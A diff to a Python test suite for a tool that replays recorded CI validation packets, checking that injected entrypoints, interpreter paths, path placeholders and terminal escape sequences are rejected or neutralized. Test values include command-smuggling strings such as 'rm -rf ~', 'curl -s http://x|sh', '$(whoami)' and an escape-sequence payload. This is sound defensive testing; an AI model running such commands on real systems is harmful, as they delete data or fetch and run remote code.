@@ -187,12 +187,12 @@ def test_observe_git_reads_revision_and_dirtiness_and_never_guesses(tmp_path):
     def answer(stdout, code=0):
         def run(argv, **kwargs):
             calls.append(argv)
-            return type("R", (), {"stdout": stdout[argv[3]], "returncode": code})()
+            return type("R", (), {"stdout": stdout[argv[4]], "returncode": code})()
         return run
 
     out = {"rev-parse": f"{'c' * 40}\n", "status": " M tools/x.py\n"}
     assert replay.observe_git(tmp_path, run=answer(out)) == {"revision": "c" * 40, "dirty": True}
-    assert calls[0][:3] == ["git", "-C", str(tmp_path)] and calls[1][3] == "status"
+    assert calls[0][:4] == ["git", "--no-optional-locks", "-C", str(tmp_path)] and calls[1][4] == "status"
     assert replay.observe_git(tmp_path, run=answer({"rev-parse": "d" * 40, "status": ""})) == {"revision": "d" * 40, "dirty": False}
     assert replay.observe_git(tmp_path, run=answer(out, code=128)) == {"revision": None, "dirty": None}
 
@@ -292,7 +292,7 @@ def test_every_report_is_labelled_as_recorded_and_unverified():
 
 @pytest.mark.parametrize(
     "entrypoint",
-    ["pip", "python", "tools.validate_change; rm -rf ~", "tools.Validate_Change", "tools.a.b", "tools.", "tools.does_not_exist", "os.system", ["tools.validate_change"], 7],
+    ["pip", "python", "tools.github_release", "tools.cleanup_linux_packages", "tools.install_macos", "tools.prepare_release", "tools.publish_linux_package_aliases", "tools.check_local_validation", "tools.validate_change; rm -rf ~", "tools.Validate_Change", "tools.a.b", "tools.", "tools.does_not_exist", "os.system", ["tools.validate_change"], 7],
 )
 def test_only_an_existing_repository_tools_module_is_offered_as_a_reproduction_command(entrypoint):
     hostile = packet()
@@ -348,7 +348,7 @@ def test_a_check_that_is_not_a_repository_gate_never_shows_its_entrypoint():
     unknown["checks"][1].update(id="not-a-gate", entrypoint=["bash", "tools/build.sh", "--platform", "macos", "--stage", "native"])
     [failed] = replay.analyze(unknown, HERE)["failing_checks"]
     assert failed["command"] is None and "does not match" in failed["command_status"]
-    assert replay.matches_gate(["/opt/py 3/bin/python", "-m", "tools.check_local_validation"], ["{python}", "-m", "tools.check_local_validation"])
+    assert not replay.matches_gate(["/opt/py 3/bin/python", "-m", "tools.check_local_validation"], ["{python}", "-m", "tools.check_local_validation"])
     assert not replay.matches_gate(["/x/python", "-m", "tools.other"], ["{python}", "-m", "tools.check_local_validation"])
     assert replay.load_gates(Path("/nonexistent-root")) == {}
     assert "shared-guards" in replay.load_gates()
@@ -553,3 +553,142 @@ def test_a_replaced_interpreter_is_reported_as_unrecorded_in_the_report():
     assert failed["command"] is None and failed["command_status"].startswith("unrecorded")
     hostile["checks"][1]["entrypoint"] = ["/usr/bin/python3", "-m", "tools.check_local_validation"]
     assert replay.analyze(hostile, HERE)["failing_checks"][0]["command"].startswith("/usr/bin/python3")
+
+
+# ------------------------------------------------ review round 4
+
+HOSTILE_KEY = "\x1b]0;PWNED\x07EVIL"
+
+
+@pytest.mark.parametrize(
+    "damage",
+    [
+        lambda p: p["environment"].update({HOSTILE_KEY: "1"}),  # outside the allowlist
+        lambda p: p["checks"][0].update(id=HOSTILE_KEY, phases={"setup": HOSTILE_KEY}),  # invalid phase value
+        lambda p: p["checks"][0].update(phases={HOSTILE_KEY: "ok"}),  # invalid phase name
+        lambda p: p["checks"][0].update(id=HOSTILE_KEY, status=HOSTILE_KEY),  # unknown check status
+        lambda p: p["checks"][0].update(id=HOSTILE_KEY, reason=5),  # a field error naming the check
+        lambda p: p["checks"][0].update(id=HOSTILE_KEY, entrypoint="x"),
+        lambda p: p["checks"][0].update(id=HOSTILE_KEY, phases=[]),
+        lambda p: p.update({HOSTILE_KEY: 1, "status": HOSTILE_KEY}),
+        lambda p: p.pop("tool_pins"),
+        lambda p: p.update(mode=HOSTILE_KEY, status="full-validation-passed", full_validation=True),
+        lambda p: p.update(schema=HOSTILE_KEY),
+    ],
+)
+def test_validation_messages_that_quote_the_packet_are_neutralized(tmp_path, capsys, damage):
+    broken = packet()
+    damage(broken)
+    assert replay.main([str(write(tmp_path, broken))], observe=lambda: HERE) == 2
+    err = capsys.readouterr().err
+    assert err.startswith("validation_replay:") and "Traceback" not in err
+    assert all(char.isprintable() or char == "\n" for char in err)
+    assert "\x1b" not in err and "\x07" not in err
+
+
+def test_load_packet_errors_are_neutralized_once(tmp_path):
+    broken = packet()
+    broken["environment"] = {HOSTILE_KEY: "1"}
+    with pytest.raises(ValueError) as caught:
+        replay.load_packet(write(tmp_path, broken))
+    assert "outside the allowlist" in str(caught.value) and "\\x1b]0;PWNED\\x07EVIL" in str(caught.value)
+    assert "\\\\x1b" not in str(caught.value)  # not escaped a second time
+
+
+def test_only_the_entrypoint_validate_change_records_is_offered():
+    assert replay.REPLAYABLE_ENTRYPOINTS == ("tools.validate_change",)
+    for module in ("github_release", "cleanup_linux_packages", "install_macos", "prepare_release", "publish_linux_package_aliases"):
+        hostile = packet()
+        hostile["invocation"].update(entrypoint=f"tools.{module}", argv=["--token", "attacker"])
+        report = replay.analyze(hostile, HERE)
+        assert report["command"] is None and "attacker" not in replay.render(report)
+
+
+@pytest.mark.parametrize(
+    "program",
+    ["/tmp/attacker/bin/sh", "curl -s http://x|sh", "/usr/bin/python3; curl x", "python3 && rm", "/usr/bin/python3 -c", "$(whoami)/python", "`id`/python", "/x/python'", '/x/"python', "sh", "/bin/bash"],
+)
+def test_the_program_of_a_gate_must_be_a_plain_interpreter(program):
+    assert replay.matches_gate([program, "-m", "tools.check_local_validation"], GATE) is False
+
+
+def test_path_placeholders_reject_whitespace_metacharacters_length_and_tmp():
+    template = ["bash", "tools/build.sh", "--output", "{output}/x"]
+    ok = ["bash", "tools/build.sh", "--output", "/var/folders/ab/out/x"]
+    assert replay.matches_gate(ok, template) is True
+    for bad in ("/var/tmp/o p/x", "/o;rm -rf /x", "/o|sh/x", "/o$(id)/x", "/tmp/o/x", "/o`id`/x", "/" + "a" * 600 + "/x", "/o\n/x"):
+        assert replay.matches_gate([*ok[:3], bad], template) is False, bad
+
+
+def test_a_failed_probe_is_never_a_match_even_when_both_sides_failed_the_same_way():
+    same = packet()
+    same["tools"]["protoc"] = "probe failed: exit 1"
+    here = json.loads(json.dumps(HERE))
+    here["tools"]["protoc"] = "probe failed: exit 1"
+    codes = [gap["code"] for gap in replay.host_mismatches(same, here)]
+    assert codes == ["tool-probe-failed:protoc"]
+    here["tools"]["protoc"] = "libprotoc 35.1"
+    assert [gap["code"] for gap in replay.host_mismatches(same, here)] == ["tool-probe-failed:protoc"]
+    ok = packet()
+    here["tools"]["protoc"] = "probe failed: TimeoutExpired"
+    assert [gap["code"] for gap in replay.host_mismatches(ok, here)] == ["tool-probe-failed:protoc"]
+
+
+def test_an_unobserved_dirty_state_here_and_an_unidentified_image_are_gaps():
+    unknown = json.loads(json.dumps(HERE))
+    unknown["dirty"] = None
+    assert [gap["code"] for gap in replay.host_mismatches(packet(), unknown)] == ["dirty-unobserved-here"]
+    no_image = packet()
+    no_image["image"] = {"runner_image": {}, "os_id": None, "os_version_id": None}
+    no_image["reproduction_gaps"] = []
+    assert "image-unrecorded" in {gap["code"] for gap in replay.analyze(no_image, HERE)["recorded_gaps"]}
+    legacy = packet()
+    legacy["schema"] = 1
+    for key in ("tool_pins", "concurrency", "cache", "artifacts", "reproduction_gaps", "image"):
+        legacy.pop(key)
+    assert "image-unrecorded" in {gap["code"] for gap in replay.analyze(legacy, HERE)["recorded_gaps"]}
+
+
+@pytest.mark.parametrize(
+    ("text", "shown"),
+    [
+        ("plain text", "plain text"),
+        ("a\\x1b literal", "a\\\\x1b literal"),  # a typed backslash is distinguishable from an escaped ESC
+        ("\x1b", "\\x1b"),
+        ("hangul\u3164filler", "hangul\\u3164filler"),
+        ("braille\u2800blank", "braille\\u2800blank"),
+        ("vs\ufe0f16", "vs\\ufe0f16"),
+        ("e\u0301 combining", "e\\u0301 combining"),
+        ("zero\u200bwidth", "zero\\u200bwidth"),
+        ("caf\u00e9", "caf\\xe9"),
+        ("emoji \U0001f600", "emoji \\U0001f600"),
+        ("tab\there", "tab\\x09here"),
+    ],
+)
+def test_neutralize_escapes_backslashes_and_everything_outside_printable_ascii(text, shown):
+    assert replay.neutralize(text) == shown
+
+
+def test_invisible_look_alike_packet_strings_cannot_pass_as_plain_text():
+    hostile = packet()
+    hostile["checks"][1]["reason"] = "ok\u3164\u2800"
+    [failed] = replay.analyze(hostile, HERE)["failing_checks"]
+    assert failed["reason"] == "ok\\u3164\\u2800"
+    assert all(0x20 <= ord(char) <= 0x7E or char == "\n" for char in replay.render(replay.analyze(hostile, HERE)))
+
+
+def test_only_the_three_known_phases_are_shown_and_a_schema_one_packet_cannot_widen_them():
+    wide = packet()
+    wide["schema"] = 1
+    for key in ("tool_pins", "concurrency", "cache", "artifacts", "reproduction_gaps", "image"):
+        wide.pop(key)
+    wide["checks"][1]["phases"] = {"setup": "ok", "body": "failed", "teardown": "clean", **{f"extra{i}": "x" * 5000 for i in range(500)}}
+    [failed] = replay.analyze(wide, HERE)["failing_checks"]
+    assert set(failed["phases"]) == {"setup", "body", "teardown"}
+    wide["checks"][1]["phases"] = {"unknown": "x"}
+    assert replay.analyze(wide, HERE)["failing_checks"][0]["phases"] is None
+
+
+def test_git_is_asked_without_optional_locks_and_the_docstring_says_what_runs():
+    assert "--no-optional-locks" in Path(replay.__file__).read_text()
+    assert "git status" in replay.__doc__ and "--version" in replay.__doc__ and "flutter" in replay.__doc__
